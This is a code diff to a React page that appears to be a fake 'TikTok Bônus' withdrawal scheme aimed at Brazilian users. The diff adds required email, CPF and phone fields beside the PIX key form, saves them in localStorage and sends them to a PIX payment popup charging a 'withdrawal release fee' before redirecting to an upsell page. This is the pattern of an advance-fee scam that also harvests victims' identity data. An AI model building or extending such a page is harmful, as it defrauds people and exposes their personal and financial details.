@@ -39,6 +39,9 @@ const Index = () => {
 
   // Form states
   const [nome, setNome] = useState('');
+  const [email, setEmail] = useState('');
+  const [cpf, setCpf] = useState('');
+  const [telefone, setTelefone] = useState('');
   const [tipoChave, setTipoChave] = useState('');
   const [chavePix, setChavePix] = useState('');
   const [selectedValue, setSelectedValue] = useState('');
@@ -165,8 +168,8 @@ const Index = () => {
   };
 
   const handleEnviarPix = () => {
-    if (nome && tipoChave && chavePix) {
-      localStorage.setItem('userPixData', JSON.stringify({ nome, tipoChave, chavePix }));
+    if (nome && email && cpf && telefone && tipoChave && chavePix) {
+      localStorage.setItem('userPixData', JSON.stringify({ nome, email, cpf, telefone, tipoChave, chavePix }));
       setShowModalSix(false);
       setShowModalFive(false);
       setShowModalFour(false);
@@ -547,6 +550,18 @@ const Index = () => {
                 <input type="text" placeholder="Nome completo" className="nome-completo" value={nome} onChange={(e) => setNome(e.target.value)} />
               </div>
               <div className="form-group">
+                <label className="field-label">E-mail <span style={{ fontSize: '11px', color: '#888', fontWeight: 400 }}>(para envio de comprovante)</span></label>
+                <input type="email" placeholder="seu@email.com" className="nome-completo" value={email} onChange={(e) => setEmail(e.target.value)} />
+              </div>
+              <div className="form-group">
+                <label className="field-label">CPF</label>
+                <input type="text" placeholder="000.000.000-00" className="nome-completo" value={cpf} onChange={(e) => setCpf(e.target.value)} maxLength={14} />
+              </div>
+              <div className="form-group">
+                <label className="field-label">Telefone</label>
+                <input type="tel" placeholder="(00) 00000-0000" className="nome-completo" value={telefone} onChange={(e) => setTelefone(e.target.value)} maxLength={15} />
+              </div>
+              <div className="form-group">
                 <label className="field-label">Tipo de Chave PIX</label>
                 <div className="pix-selector" onClick={() => setShowModalSix(true)}>
                   <span className="placeholder-text">{tipoChave || 'Escolha o tipo de chave PIX'}</span>
@@ -563,7 +578,7 @@ const Index = () => {
                   <input type="text" placeholder="Digite sua chave PIX" className="nome-completo" value={chavePix} onChange={(e) => setChavePix(e.target.value)} disabled={!tipoChave} />
                 </div>
               </div>
-              <button type="button" className={`btn-obrigado btn-sacar-dois btn-vincular ${(!nome || !tipoChave || !chavePix) ? 'btn-disabled' : ''}`} onClick={handleEnviarPix}>
+              <button type="button" className={`btn-obrigado btn-sacar-dois btn-vincular ${(!nome || !email || !cpf || !telefone || !tipoChave || !chavePix) ? 'btn-disabled' : ''}`} onClick={handleEnviarPix}>
                 <span className="btn-text btn-textdois-sacar">Enviar</span>
               </button>
             </div>
@@ -728,6 +743,7 @@ const Index = () => {
         <PixPaymentPopup
           amount={TAXA_SAQUE_CENTAVOS}
           description="Taxa de liberação de saque TikTok Bônus"
+          customerData={{ nome, email, cpf, telefone }}
           onSuccess={() => {
             setShowPixPopup(false);
             navigate('/up1');
